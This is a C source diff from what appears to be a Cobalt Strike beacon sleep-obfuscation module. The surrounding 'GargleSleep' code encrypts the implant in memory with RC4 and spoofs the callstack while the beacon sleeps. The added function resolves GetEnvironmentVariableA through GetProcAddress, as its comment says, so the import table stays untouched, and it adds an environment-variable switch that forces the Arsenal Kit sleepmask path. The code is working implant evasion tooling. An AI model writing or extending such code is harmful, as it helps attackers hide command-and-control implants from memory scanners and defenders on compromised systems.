@@ -24,6 +24,25 @@ static void setup_trampoline2() {
 	gargle_trampoline(setup_trampoline2, _gargle_it);
 }
 
+/* kit-compat test knob: BEACON_SLEEPMASK_KIT=1 in the beacon process
+ * skips the gen3 window so GargleSleep exercises the official TS-embedded
+ * sleepmask BOF path - the 4.9 Arsenal Kit contract
+ * sleep_mask(parms, pSleep, time) driven by conv=1 in boff.cpp. Resolved
+ * dynamically (GetModuleHandleA/GetProcAddress are already static imports
+ * via sleepmask_gen3's g3_init) so the import table stays untouched. */
+static int kit_path_forced(void) {
+	HMODULE k32;
+	DWORD (WINAPI * pGetEnv)(LPCSTR, LPSTR, DWORD);
+	char buf[8];
+	k32 = GetModuleHandleA("kernel32.dll");
+	if (k32 == NULL)
+		return 0;
+	pGetEnv = (DWORD (WINAPI *)(LPCSTR, LPSTR, DWORD))GetProcAddress(k32, "GetEnvironmentVariableA");
+	if (pGetEnv == NULL)
+		return 0;
+	return pGetEnv("BEACON_SLEEPMASK_KIT", buf, sizeof(buf)) > 0 && buf[0] == '1';
+}
+
 void GargleSleep(DWORD time) {
 #if !defined(_M_IX86)
 	GARGLEF func;
@@ -40,7 +59,7 @@ void GargleSleep(DWORD time) {
 #if defined(_M_X64)
 	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
 	 * any init failure falls through to the official sleepmask BOF. */
-	if (gen3_sleep(time))
+	if (!kit_path_forced() && gen3_sleep(time))
 		return;
 	g3_log("gargle: gen3 fell back to official path", 0x7fffffff);
 #else
